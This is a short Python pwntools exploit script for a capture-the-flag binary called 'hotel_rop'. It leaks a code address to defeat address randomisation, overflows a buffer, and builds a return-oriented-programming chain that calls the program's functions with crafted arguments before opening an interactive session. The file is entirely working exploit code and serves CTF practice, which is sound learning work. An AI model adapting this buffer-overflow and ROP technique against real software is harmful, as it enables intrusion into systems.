#!/usr/bin/env python3

from pwn import *
import re

context.log_level = "debug"

HOST = "dctf1-chall-hotel-rop.westeurope.azurecontainer.io"
PORT = 7480
e = ELF("./hotel_rop")

conn = process([e.path, e.path])
conn = remote(HOST, PORT)

pop_rdi = 0x000000000000140b #: pop rdi ; ret
pop_rsi_pop_r15 = 0x0000000000001409 #: pop rsi ; pop r15 ; ret

text_addr = int(re.search(b"0[xX][0-9a-fA-F]+", conn.recv()).group(), 16) - e.symbols["main"]

payload = b"a"*0x28
payload += p64(text_addr + e.symbols["california"])
payload += p64(text_addr + e.symbols["silicon_valley"])

payload += p64(text_addr + pop_rdi)
payload += p64(0x1337C0DE)
payload += p64(text_addr + pop_rsi_pop_r15)
payload += p64(0x0DEADC0DE - 0x1337C0DE)
payload += p64(0)
payload += p64(text_addr + e.symbols["loss"])
conn.sendline(payload)

conn.interactive()
